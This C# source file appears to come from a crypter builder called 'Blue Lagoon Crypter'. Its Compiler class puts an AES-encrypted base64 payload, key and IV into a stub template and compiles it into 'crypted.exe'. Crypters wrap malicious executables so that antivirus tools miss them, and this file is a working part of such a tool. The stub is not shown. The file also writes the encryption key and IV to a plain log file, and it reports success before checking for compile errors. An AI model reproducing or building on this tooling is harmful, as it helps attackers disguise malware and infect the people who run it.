using Blue_Lagoon_Crypter__Windowed_.Properties;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace Blue_Lagoon_Crypter__Windowed_.Tools
{
    internal class Compiler
    {
        private byte[] Key;
        private byte[] IV;
        private byte[] Base64;

        string Stub = Resources.Stub;

        private List<string> replacementLog = new List<string>(); // List to store replacement information

        public Compiler(string base64Aes, string key, string iv)
        {
            this.Key = Convert.FromBase64String(key);
            this.IV = Convert.FromBase64String(iv);
            this.Base64 = Convert.FromBase64String(base64Aes);

            // Log key, IV, and base64 data
            LogData("Key", Key);
            LogData("IV", IV);
            LogData("Base64", Base64);

            SetSettings();
        }

        private void LogData(string name, byte[] data)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    writer.WriteLine(timestamp);

                    string hexString = BitConverter.ToString(data).Replace("-", "");
                    writer.WriteLine(name + " : " + hexString);

                    writer.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error logging " + name + " : " + ex.Message);
            }
        }

        public void SetSettings()
        {
            try
            {
                // Log the replacements made in the Stub string
                LogReplacements();

                Stub = Stub.Replace("%BASE64%", Convert.ToBase64String(Base64)).Replace("%KEY%", Convert.ToBase64String(Key)).Replace("%IV%", Convert.ToBase64String(IV));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        // Log the replacements made in the Stub string
        private void LogReplacements()
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
                {
                    foreach (string replacement in replacementLog)
                    {
                        writer.WriteLine(replacement);
                    }
                    writer.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error logging replacements: " + ex.Message);
            }
        }

        public void Compile()
        {
            try
            {
                string[] referencedAsm = new string[] // 09.09.2023 ___ 3:50 am ___ after changing the Stub and adding execution, added 'Threading.Thread.dll'
                {
                    "System.dll", "System.IO.dll", "System.Runtime.InteropServices.dll", "Mscorlib.dll", "System.Core.dll"//, "System.Diagnostics.dll"//, "System.Threading.Thread.dll"
                };
                Dictionary<string, string> providerOptions = new Dictionary<string, string>()
                {
                    {"CompilerVersion", "v4.0"}
                };
                var compileOptions = "/target:exe /platform:x64 /optimize+";
                using (CSharpCodeProvider chCodeProvide = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParam = new CompilerParameters(referencedAsm)
                    {
                        GenerateExecutable = true,
                        OutputAssembly = "crypted.exe",
                        CompilerOptions = compileOptions,
                        TreatWarningsAsErrors = true
                    };
                    CompilerResults compilerResults = chCodeProvide.CompileAssemblyFromSource(compilerParam, Stub);

                    MessageBox.Show("File has been compiled successfully!");

                    // Log compilation result including errors
                    LogCompilationResult(compilerResults);
                }
            }
            catch (IOException ioEx)
            {
                MessageBox.Show("Failed due to IO error: " + ioEx.Message);
                Console.WriteLine("IO error during compilation: " + ioEx.Message);
                LogError("IO error during compilation", ioEx.Message);
            }
            catch (UnauthorizedAccessException authEx)
            {
                MessageBox.Show("Failed due to unauthorized access: " + authEx.Message);
                Console.WriteLine("Unauthorized access error during compilation: " + authEx.Message);
                LogError("Unauthorized access error during compilation", authEx.Message);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed. Compilation Errors occurred.");
                Console.WriteLine("Error during compilation: " + ex.Message);
                LogError("Error during compilation", ex.Message);
            }
        }
        private void LogError(string operation, string errorMessage)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    writer.WriteLine(timestamp + " Error in " + operation + " :");

                    writer.WriteLine(errorMessage);

                    writer.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error logging " + operation + " error: " + ex.Message);
            }
        }

        private void LogCompilationResult(CompilerResults compilerResults)
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("logging_compiler.txt", true))
                {
                    if (compilerResults.Errors.Count > 0)
                    {
                        writer.WriteLine("Compilation Errors:");
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            writer.WriteLine(compilerError.ToString());
                        }
                    }
                    else
                    {
                        writer.WriteLine("File has been compiled successfully!");
                    }
                    writer.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error logging compilation result: " + ex.Message);
            }
        }
    }
}
